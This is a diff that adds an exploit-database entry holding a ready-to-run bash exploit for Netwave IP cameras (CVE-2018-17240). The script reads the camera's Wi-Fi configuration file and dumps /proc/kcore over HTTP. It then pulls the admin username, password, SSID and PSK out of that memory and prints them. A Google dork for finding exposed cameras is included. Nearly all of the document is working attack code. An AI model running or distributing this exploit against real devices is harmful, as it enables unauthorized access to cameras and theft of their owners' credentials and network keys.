@@ -1,0 +1,73 @@
+id: 39854
+date: 01/08/2025
+title: Netwave IP Camera Secret Disclosure Exploit
+author: FenrirSec
+cves: CVE-2018-17240
+
+#!/bin/bash
+
+## Exploit Title: Netwave
+## Google Dork: "Netwave security camera" "Live feed"
+## Exploit Author: Jeremie Amsellem <jeremie(a)fenrir.pro>
+## Version: No version specified by the vendor
+## Tested on: Kali Linux
+##
+## Written by lp1 <jeremie(a)fenrir.pro>
+##
+## Run this exploit on a vulnerable Netwave Camera in order
+## To dump the camera's network configuration and credentials
+##
+## The credentials "Possible Username" and "Possible Password"
+## can be used to login onto the web interface.
+##
+## Usage : bash netwave_exploit.sh host port
+##
+
+KCORE_OUTPUT_FILE=".kcore_dump_strings"
+
+function usage() {
+    echo "Usage   : $0 host port"
+    echo "Example : $0 192.168.1.69 81"
+}
+
+function print_line() {
+    echo -e "~ [ $1 ] ~\n"
+}
+
+if [ "$#" -lt 1 ]; then
+    usage
+    exit 0
+fi
+
+CAM_HOST="$1:$2"
+
+print_line "Retrieving Camera's Wi-Fi configuration from RT2870STA.dat"
+
+CAM_WIFI_CONFIGURATION=$(curl http://$CAM_HOST//etc/RT2870STA.dat 2>/dev/null)
+
+echo -e "$CAM_WIFI_CONFIGURATION \n"
+
+print_line "Retrieving global configuration from get_status.cgi"
+
+CAM_MAC=$(curl http://$CAM_HOST/get_status.cgi 2>/dev/null | grep id= | cut -d "'"  -f 2)
+
+echo -e "Camera ID -" $CAM_MAC "\n"
+
+print_line "Dumping camera ROM memory... (This might take a few minutes)"
+
+curl http://$CAM_HOST//proc/kcore 2>/dev/null | strings >> $KCORE_OUTPUT_FILE
+
+MAC_LINE=$(grep -ne "^$CAM_MAC\$" $KCORE_OUTPUT_FILE | head -n 1 | cut -d ':' -f 1)
+
+MEM_LINES=$(tail -n +$MAC_LINE $KCORE_OUTPUT_FILE | head)
+
+echo "Possible Username :" $(echo $MEM_LINES | cut -d ' ' -f 2)
+echo "Possible Password :" $(echo $MEM_LINES | cut -d ' ' -f 3)
+echo "Default SSID      :" $(echo $MEM_LINES | cut -d ' ' -f 4)
+echo "Default PSK       :" $(echo $MEM_LINES | cut -d ' ' -f 5)
+echo -e "\n"
+
+print_line "Removing temporary memory dump"
+rm -frv $KCORE_OUTPUT_FILE
+
+#  0day.today [2025-01-13]  #
